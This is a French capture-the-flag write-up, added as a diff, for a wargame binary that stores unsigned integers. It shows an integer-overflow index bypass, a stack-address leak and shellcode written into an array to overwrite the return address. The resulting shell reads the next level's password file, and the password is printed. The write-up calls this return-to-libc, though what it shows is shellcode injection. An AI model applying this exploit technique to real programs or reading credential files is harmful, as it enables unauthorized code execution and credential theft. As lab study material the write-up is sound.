@@ -1,0 +1,99 @@
+en stoquant quelques nombres dans la base de donnee on se rends vite compte
+que wil a utilisé des unsigned int pour stoquer les valeurs.
+
+Input command: store 
+ Number: -1
+ Index: 4
+ Completed store command successfully
+Input command: read
+ Index: 4
+ Number at data[4] is 4294967295
+ Completed read command successfully
+
+
+on se rends aussi compte que tous les indexes multiples de 3 sont reservés par wil.
+
+
+Input command: read
+ Index: -9
+ Number at data[4294967287] is 4294956148
+ Completed read command successfully
+
+un mot a propos ce cette addresse: j ai fait le sale:
+a coup de gdb et de x/1000x $esp et on se ballade dans la stack afin de le trouver
+j ai enregistré "1000" a la position "1" et je suis partis a la recherche de
+pleins de zero et d'un "03e8"
+
+on peut aussi voir dans gdb qu'une operation:
+   0x080486c5 <+149>:	shl    $0x2,%eax
+est presente dans store_number, un declage binaire vers la gauche de 2 donc, car
+ecrire dans un tableau d'unsigned int reviens a faire:
+array[index * 4] = ...
+aussi notre overflow va intervenir a ce moment précis, on devras donc diviser par 4
+les valeurs ou on veut reelement ecrire.
+
+addresse de l'array d'int: read + -9 nous donne son addresse en unsigned int
+on ne cherche pas avoir tab[0] mais &tab[0]
+
+on a pu trouver l'offset de 114 (donc en realitée 114 x 4 pour l'offset en memoire)
+a force d'augmenter l'index apres la taille du tableau, la 14eme fois ca a crash
+addresse de eip: FFFFD474 + 114 = FFFFFFF7
+
+
+on va donc prendre un shellcode, le transformer en unsigned int, puis remplire
+le tableau avec, pour le probleme du % 3 pas de panique: on va overflow
+
+hors de la vm on lance:
+clang Ressources/hammer.c -o hammer
+./hammer
+[idx] value        index        hex
+[  0] 2572684138   1073741824   0x99580b6a
+[  1] 791636050    1            0x2f2f6852
+[  2] 795371635    2            0x2f686873
+[  3] 2305714530   1073741827   0x896e6962
+[  4] 3452514787   4            0xcdc931e3
+[  5] 9474176      5            0x909080
+[eip] 4294956148   1073741938   0xffffd474
+[ -9] 4294967287
+
+et on peut donc remplire le tableau avec notre shellcode puis quiter le main
+pour effectuer une attaque par retour a la libc
+
+Input command: store
+ Number: 2572684138
+ Index: 1073741824
+ Completed store command successfully
+Input command: store
+ Number: 791636050
+ Index: 1
+ Completed store command successfully
+Input command: store
+ Number: 795371635
+ Index: 2
+ Completed store command successfully
+Input command: store
+ Number: 2305714530
+ Index: 1073741827
+ Completed store command successfully
+Input command: store
+ Number: 3452514787
+ Index: 4
+ Completed store command successfully
+Input command: store
+ Number: 9474176
+ Index: 5
+ Completed store command successfully
+Input command: read
+ Index: -9
+ Number at data[4294967287] is 4294956148
+ Completed read command successfully
+Input command: store
+ Number: 4294956148
+ Index: 1073741938
+ Completed store command successfully
+Input command: quit
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$
+
+et voila.
